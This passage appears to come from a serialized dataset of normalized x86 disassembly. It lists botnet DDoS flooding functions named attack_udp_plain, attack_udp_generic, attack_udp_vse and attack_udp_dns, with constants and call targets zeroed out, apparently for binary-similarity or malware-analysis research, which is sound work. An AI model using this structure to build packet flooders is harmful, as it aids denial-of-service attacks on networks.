\nMOV~[EDI+0],0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~ECX,[ESP+0]\nMOV~[EDI+0],AX\nMOV~EAX,[ESP+0]\nMOV~DX,[EDI+0]\nADD~ESP,0\nLEA~EAX,[EAX+EAX*2]\nSHL~EAX,0\nMOV~[EAX+ECX+0],DX\nADD~EAX,ECX\nPUSH~0\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nMOV~EDX,[ESP+0]\nPUSH~EDX\nCALL~FOO\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~EAX,EBP\nJL~FOO\nTEST~EBP,EBP\nJMP~FOO\nMOV~EBX,[EAX+0]\nCALL~FOO\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nMOV~EDX,[ESP+0]\nLEA~ECX,[EDX+EDX*2]\nMOV~EDX,[ESP+0]\nMOV~CL,[EDX+ECX*8+0]\nAND~ECX,0\nSHR~EAX,CL\nADD~EAX,EBX\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nCMP~[ESP+0],0\nMOV~[ESI+0],EAX\nJNZ~FOO\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[ESI+0],EAX\nJNZ~FOO\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[ESI+0],AX\nJNZ~FOO\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[ESI+0],AX\nJNZ~FOO\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[EDI+0],AX\nJNZ~FOO\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[EDI+0],EAX\nJNZ~FOO\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[EDI+0],EAX\nJZ~FOO\nCALL~FOO\nMOV~[EDI+0],AX\nJMP~FOO\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p50
L1303L
tp51
a(S'attack_udp_plain'
p52
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~AL,[ESP+0]\nMOV~EBX,[ESP+0]\nMOV~DL,AL\nMOV~[ESP+0],AL\nAND~EDX,0\nMOVZX~ESI,[ESP+0]\nMOV~[ESP+0],EDX\nPUSH~0\nPUSH~EDX\nCALL~FOO\nMOV~EBP,EAX\nPOP~EAX\nPOP~EDX\nPUSH~0\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~ECX,ESI\nMOV~[ESP+0],EAX\nAND~ECX,0\nPUSH~0\nMOV~EDI,ECX\nPUSH~0\nPUSH~EBX\nPUSH~ECX\nCALL~FOO\nMOV~[ESP+0],AX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~EDI\nCALL~FOO\nPUSH~0\nMOV~ESI,EAX\nPUSH~0\nPUSH~EBX\nPUSH~EDI\nCALL~FOO\nMOV~[ESP+0],AX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~EDI\nCALL~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],AL\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nADD~ESP,0\nCMP~SI,0\nJZ~FOO\nROR~SI,0\nMOV~[ESP+0],SI\nMOV~AL,[ESP+0]\nAND~EAX,0\nMOV~[ESP+0],EAX\nTEST~EAX,EAX\nJLE~FOO\nMOV~EDX,[ESP+0]\nMOV~ESI,[ESP+0]\nINC~EDX\nMOV~[ESP+0],0\nMOV~[ESP+0],EDX\nJMP~FOO\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[ESI+0],AX\nPUSH~EBX\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~ECX,[ESP+0]\nMOV~EDX,EAX\nMOV~EAX,[ESP+0]\nADD~ESP,0\nCMP~EDX,0\nMOV~[ECX+EAX*4-0],EDX\nJZ~FOO\nMOV~AX,[ESP+0]\nMOV~[ESP+0],0\nMOV~[ESP+0],AX\nLEA~EAX,[ESP+0]\nMOV~[ESP+0],0\nPUSH~ECX\nPUSH~0\nPUSH~EAX\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nCMP~[ESI+0],0\nJA~FOO\nMOV~EBX,[ESI+0]\nCALL~FOO\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nXOR~ECX,ECX\nMOV~CL,[ESI+0]\nSHR~EAX,CL\nADD~EAX,EBX\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~[ESI+0],EAX\nPUSH~EDX\nPUSH~0\nPUSH~ESI\nADD~ESI,0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EAX,[ECX+EDX*4-0]\nPUSH~EAX\nCALL~FOO\nMOV~EAX,[ESP+0]\nMOV~EDI,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~EDI,[ESP+0]\nJZ~FOO\nPUSH~EDI\nPUSH~EDI\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~ECX,[ESP+0]\nADD~ESP,0\nMOV~[EBP+ECX*4-0],EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nJMP~FOO\nMOV~EAX,[ESP+0]\nLEA~EDI,[EAX+0]\nMOV~EAX,[ESP+0]\nTEST~EAX,EAX\nNOP\nLEA~ESI,[ESI+0]\nJLE~FOO\nMOV~ESI,[ESP+0]\nAND~ESI,0\nCMP~[ESP+0],0\nJNZ~FOO\nMOV~EBX,0\nMOV~EAX,[EBP+EBX*4-0]\nPUSH~0\nPUSH~ESI\nPUSH~EAX\nMOV~EDX,[ESP+0]\nMOV~EAX,[EDX+EBX*4-0]\nINC~EBX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~EDI,EBX\nJNZ~FOO\nMOV~EAX,[ESP+0]\nTEST~EAX,EAX\nJMP~FOO\nCALL~FOO\nMOV~[ESP+0],AX\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN\nMOV~[ESP+0],0\nMOV~[ESP+0],ESI\nMOV~ECX,[ESP+0]\nPUSH~EAX\nPUSH~EAX\nMOV~EBX,[EBP+ECX*4-0]\nMOV~ECX,[ESP+0]\nPUSH~ECX\nPUSH~EBX\nCALL~FOO\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nMOV~EAX,[ESP+0]\nMOV~EDX,[ESP+0]\nMOV~EDX,[EDX+EAX*4-0]\nPUSH~EDX\nCALL~FOO\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~[ESP+0],EDI\nJZ~FOO\nJMP~FOO"'
p53
L682L
tp54
a(S'attack_udp_generic'
p55
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nXOR~EAX,EAX\nMOV~EDI,[ESP+0]\nMOVZX~ESI,[ESP+0]\nPUSH~0\nAND~ESI,0\nMOV~AL,[ESP+0]\nMOV~[ESP+0],EAX\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nMOV~EAX,<STR>\nPUSH~EAX\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~EAX,[ESP+0]\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EBP,[ESP+0]\nMOV~[ESP+0],DX\nMOV~[ESP+0],CX\nMOV~[ESP+0],BP\nMOV~[ESP+0],AX\nCMP~AX,0\nJBE~FOO\nMOV~[ESP+0],0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],0\nTEST~EAX,EAX\nJLE~FOO\nMOV~DI,[ESP+0]\nMOV~SI,[ESP+0]\nADD~EDI,0\nADD~ESI,0\nXOR~EBX,EBX\nPUSH~EBP\nPUSH~EBP\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX+EBX*4],EAX\nMOV~EAX,[ESP+0]\nMOV~ECX,[EDX+EAX*4]\nMOV~BYTEPTR[ECX],0\nLEA~EBX,[ECX+0]\nMOV~AL,[ESP+0]\nMOV~[ECX+0],AL\nMOV~EAX,EDI\nMOV~DL,[ESP+0]\nROR~AX,0\nMOV~[ECX+0],AX\nMOV~AX,[ESP+0]\nADD~ESP,0\nMOV~[ECX+0],DL\nROR~AX,0\nCMP~[ESP+0],0\nMOV~[ECX+0],AX\nJZ~FOO\nMOV~[ECX+0],0\nMOV~[ECX+0],0\nMOV~EBP,[ESP+0]\nMOV~[ECX+0],EBP\nMOV~EBP,[ESP+0]\nMOV~EDX,[ESP+0]\nLEA~EAX,[EDX+EDX*2]\nMOV~EAX,[EBP+EAX*8+0]\nMOV~[ECX+0],EAX\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[ECX+0],AX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~EAX,ESI\nROR~AX,0\nMOV~[EBX+0],AX\nLEA~EBX,[EDX+0]\nMOV~[ESP+0],EBX\nCMP~[ESP+0],EBX\nJG~FOO\nMOV~ECX,[ESP+0]\nTEST~ECX,ECX\nLEA~ESI,[ESI+0]\nJLE~FOO\nMOV~AX,[ESP+0]\nMOV~[ESP+0],0\nAND~EAX,0\nLEA~EBX,[EAX+0]\nLEA~EBP,[EAX+0]\nXOR~EAX,EAX\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~ESI,[EDX+EAX*4]\nLEA~EAX,[EAX+EAX*2]\nLEA~EAX,[ECX+EAX*8]\nLEA~EDI,[ESI+0]\nCMP~[EAX+0],0\nJBE~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJNZ~FOO\nMOV~[ESI+0],0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nMOV~[ESI+0],AX\nMOV~[EDI+0],0\nPUSH~EBX\nMOV~AX,[EDI+0]\nAND~EAX,0\nPUSH~EAX\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[EDI+0],AX\nMOV~EAX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~DX,[EDI+0]\nLEA~EAX,[EAX+EAX*2]\nADD~ESP,0\nSHL~EAX,0\nMOV~[EAX+ECX+0],DX\nADD~EAX,ECX\nPUSH~0\nPUSH~EAX\nPUSH~0\nPUSH~EBP\nPUSH~ESI\nMOV~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~[ESP+0],EAX\nJG~FOO\nMOV~ECX,[ESP+0]\nTEST~ECX,ECX\nJMP~FOO\nMOV~EAX,[EAX+0]\nMOV~[ESP+0],EAX\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~[ESP+0],EAX\nCALL~FOO\nMOV~EDX,[ESP+0]\nLEA~ECX,[EDX+EDX*2]\nMOV~EDX,[ESP+0]\nMOV~CL,[EDX+ECX*8+0]\nMOV~EDX,[ESP+0]\nAND~ECX,0\nSHR~EAX,CL\nADD~EAX,EDX\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nCMP~[ESP+0],0\nMOV~[ESI+0],EAX\nJNZ~FOO\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[ESI+0],EAX\nJNZ~FOO\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[ESI+0],AX\nJNZ~FOO\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[ESI+0],AX\nJNZ~FOO\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[EDI+0],AX\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nMOV~AX,[ESP+0]\nAND~EAX,0\nPUSH~EAX\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p56
L1009L
tp57
a(S'attack_udp_vse'
p58
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ESI,[ESP+0]\nMOV~BL,[ESP+0]\nPUSH~0\nAND~EBX,0\nMOV~AL,[ESP+0]\nAND~EAX,0\nPUSH~EAX\nMOV~EBP,EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nPUSH~0\nMOV~EDI,EAX\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nMOV~EBX,EAX\nCALL~FOO\nPOP~EAX\nPOP~EDX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~ESI,EAX\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~[ESP+0],DX\nMOV~[ESP+0],CX\nMOV~[ESP+0],BX\nMOV~[ESP+0],0\nTEST~EBP,EBP\nJLE~FOO\nXOR~EBX,EBX\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX+EBX*4],EAX\nMOV~EAX,[ESP+0]\nMOV~EDX,[EDX+EAX*4]\nMOV~BYTEPTR[EDX],0\nLEA~ECX,[EDX+0]\nMOV~BL,[ESP+0]\nMOV~[EDX+0],BL\nMOV~EBX,EDI\nMOV~EAX,[ESP+0]\nADD~EAX,0\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~AL,[ESP+0]\nMOV~[EDX+0],AL\nADD~ESP,0\nTEST~BL,BL\nJZ~FOO\nMOV~[EDX+0],0\nMOV~[EDX+0],0\nMOV~EAX,<STR>\nMOV~EBX,[ESP+0]\nMOV~[EDX+0],EAX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nMOV~EAX,[EBX+EAX*8+0]\nMOV~[EDX+0],EAX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[ECX+0],AX\nMOV~EAX,[ESP+0]\nADD~EAX,0\nMOV~[EDX+0],0\nROR~AX,0\nMOV~[ECX+0],AX\nPUSH~EBX\nMOV~ECX,[ESP+0]\nLEA~EAX,[EDX+0]\nPUSH~ECX\nPUSH~ESI\nPUSH~EAX\nCALL~FOO\nMOV~EBX,[ESP+0]\nINC~EBX\nMOV~[ESP+0],EBX\nADD~ESP,0\nCMP~EBP,EBX\nJG~FOO\nTEST~EBP,EBP\nLEA~ESI,[ESI+0]\nJLE~FOO\nMOV~[ESP+0],0\nXOR~EAX,EAX\nMOV~EDX,[ESP]\nMOV~ECX,[ESP+0]\nMOV~ESI,[EDX+EAX*4]\nLEA~EAX,[EAX+EAX*2]\nLEA~EAX,[ECX+EAX*8]\nLEA~EDI,[ESI+0]\nCMP~[EAX+0],0\nJBE~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nMOV~[ESI+0],0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nMOV~[ESI+0],AX\nMOV~EAX,[ESP+0]\nADD~EAX,0\nMOV~[EDI+0],0\nPUSH~EAX\nMOV~AX,[EDI+0]\nAND~EAX,0\nPUSH~EAX\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[EDI+0],AX\nMOV~EAX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~DX,[EDI+0]\nLEA~EAX,[EAX+EAX*2]\nADD~ESP,0\nSHL~EAX,0\nMOV~[EAX+ECX+0],DX\nADD~EAX,ECX\nPUSH~0\nPUSH~EAX\nPUSH~0\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nPUSH~ESI\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~EBP,EAX\nJG~FOO\nTEST~EBP,EBP\nJMP~FOO\nMOV~EBX,[EAX+0]\nCALL~FOO\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nMOV~EDX,[ESP+0]\nLEA~ECX,[EDX+EDX*2]\nMOV~EDX,[ESP+0]\nMOV~CL,[EDX+ECX*8+0]\nAND~ECX,0\nSHR~EAX,CL\nADD~EAX,EBX\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nCMP~[ESP+0],0\nMOV~[ESI+0],EAX\nJNZ~FOO\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[ESI+0],AX\nJNZ~FOO\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[ESI+0],AX\nJNZ~FOO\nCALL~FOO\nMOV~[EDI+0],AX\nJMP~FOO\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p59
L860L
tp60
a(S'attack_udp_dns'
p61
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~AL,[ESP+0]\nMOV~EBX,[ESP+0]\nMOV~[ESP+0],AL\nXOR~EAX,EAX\nMOVZX~ESI,[ESP+0]\nPUSH~0\nAND~ESI,0\nMOV~AL,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EBP,EAX\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EDI\nPOP~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~EBX\nPOP~ESI\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nMOV~EBX,EAX\nCALL~FOO\nADD~ESP,0\nTEST~EBX,EBX\nJS~FOO\nPUSH~ECX\nPUSH~0\nLEA~EDX,[ESP+0]\nPUSH~EDX\nPUSH~EBX\nCALL~FOO\nMOV~[ESP],EBX\nMOV~EDI,EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~EDI\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nMOV~ESI,EAX\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nCMP~ESI,0\nJZ~FOO\nCMP~EDI,ESI\nJLE~FOO\nMOV~EDX,ESI\nXOR~EBX,EBX\nMOV~ECX,EDI\nMOV~AL,[ESP+EDX+0]\nTEST~BL,BL\nJNZ~FOO\nCMP~AL,0\nJZ~FOO\nCMP~AL,0\nJZ~FOO\nMOV~BL,0\nCMP~AL,0\nJZ~FOO\nSUB~EAX,0\nCMP~AL,0\nJA~FOO\nLEA~EAX,[EDI-0]\nCMP~EDX,EAX\nJZ~FOO\nINC~EDX\nCMP~ECX,EDX\nJNZ~FOO\nCALL~FOO\nAND~EAX,0\nCMP~EAX,0\nJZ~FOO\nJB~FOO\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,0\nJNZ~FOO\nMOV~[ESP+0],0\nMOV~EDI,[ESP+0]\nTEST~EDI,EDI\nJZ~FOO\nSUB~ESP,0\nMOV~ESI,[ESP+0]\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nMOV~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~[ESP+0],DX\nMOV~DL,[ESP+0]\nAND~EDX,0\nMOV~ESI,[ESP+0]\nMOV~AL,[ESP+0]\nMOV~[ESP+0],CX\nMOV~[ESP+0],SI\nMOV~[ESP+0],BP\nMOV~[ESP+0],AL\nMOV~[ESP+0],0\nMOV~[ESP+0],EDX\nTEST~EDX,EDX\nJLE~FOO\nXOR~EAX,EAX\nMOV~EDX,[ESP+0]\nMOV~AL,[ESP+0]\nXOR~EBX,EBX\nADD~EAX,EDX\nMOV~EDX,[ESP+0]\nMOVZX~EDI,[ESP+0]\nLEA~ECX,[EAX+0]\nLEA~EBP,[EAX+0]\nMOV~EAX,EDI\nINC~EDX\nAND~EAX,0\nMOV~[ESP+0],CX\nMOV~[ESP],EAX\nMOV~[ESP+0],EDX\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~ECX,[ESP+0]\nMOV~[ECX+EBX*4],EAX\nMOV~EAX,[ESP+0]\nMOV~EDX,[ECX+EAX*4]\nMOV~BYTEPTR[EDX],0\nLEA~EBX,[EDX+0]\nMOV~AL,[ESP+0]\nLEA~ECX,[EDX+0]\nMOV~[EDX+0],AL\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~AL,[ESP+0]\nADD~ESP,0\nMOV~[EDX+0],AL\nCMP~[ESP+0],0\nJZ~FOO\nMOV~[EDX+0],0\nMOV~[EDX+0],0\nMOV~EAX,<STR>\nMOV~ESI,[ESP+0]\nMOV~[EDX+0],EAX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~EAX,EBP\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~EAX,EDI\nMOV~[ECX+0],0\nMOV~[ECX+0],0\nMOV~[EDX+0],AL\nMOV~[EDX+0],ESI\nMOV~ECX,[ESP]\nPUSH~EAX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nLEA~EBX,[EDX+ECX+0]\nMOV~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[EBX+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~ESI,[ESP+0]\nTEST~ESI,ESI\nJLE~FOO\nMOV~EDX,EBX\nXOR~ECX,ECX\nMOV~EAX,0\nJMP~FOO\nINC~ECX\nINC~EAX\nCMP~EAX,[ESP+0]\nJZ~FOO\nMOV~ESI,[ESP+0]\nCMP~[EAX+ESI-0],0\nJNZ~FOO\nMOV~[EDX],CL\nLEA~EDX,[EAX+EBX]\nXOR~ECX,ECX\nJMP~FOO\nJLE~FOO\nMOV~CL,[ESP+0]\nMOV~EAX,[ESP+0]\nAND~ECX,0\nMOV~[ESP+0],0\nADD~EAX,ECX\nMOV~EDI,ECX\nLEA~ESI,[EAX+0]\nLEA~EBP,[EAX+0]\nMOV~[ESP+0],ESI\nXOR~EAX,EAX\nMOV~EDX,[ESP+0]\nCMP~[ESP+0],0\nMOV~EBX,[EDX+EAX*4]\nLEA~ESI,[EBX+0]\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nLEA~EAX,[EBX+0]\nPUSH~ECX\nPUSH~ECX\nPUSH~EDI\nPUSH~EAX\nCALL~FOO\nMOV~[EBX+0],0\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~EBX\nCALL~FOO\nMOV~[EBX+0],AX\nMOV~EAX,[ESP+0]\nMOV~[ESI+0],0\nPUSH~EAX\nMOV~AX,[ESI+0]\nAND~EAX,0\nPUSH~EAX\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESI+0],AX\nMOV~EAX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nADD~ESP,0\nSHL~EAX,0\nMOV~[EAX+ECX+0],EDX\nMOV~DX,[ESI+0]\nMOV~[EAX+ECX+0],DX\nADD~EAX,ECX\nPUSH~0\nPUSH~EAX\nPUSH~0\nPUSH~EBP\nPUSH~EBX\nMOV~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~EAX,[ESP+0]\nJL~FOO\nMOV~EBX,[ESP+0]\nTEST~EBX,EBX\nJLE~FOO\nJMP~FOO\nCALL~FOO\nMOV~[EBX+0],AX\nJMP~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nJMP~FOO\nCALL~FOO\nMOV~[EBX+0],AX\nJMP~FOO\nCALL~FOO\nMOV~[EBX+0],AX\nJMP~FOO\nMOV~AL,CL\nMOV~[EDX],AL\nMOV~EDX,[ESP+0]\nLEA~EAX,[EBX+EDX]\nMOV~EBX,[ESP+0]\nINC~EBX\nMOV~[EAX+0],0\nMOV~[EAX+0],0\nMOV~[ESP+0],EBX\nCMP~EBX,[ESP+0]\nJL~FOO\nMOV~EBX,[ESP+0]\nTEST~EBX,EBX\nJMP~FOO\nMOV~EDX,EBX\nXOR~EAX,EAX\nJMP~FOO\nSUB~ESP,0\nMOV~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\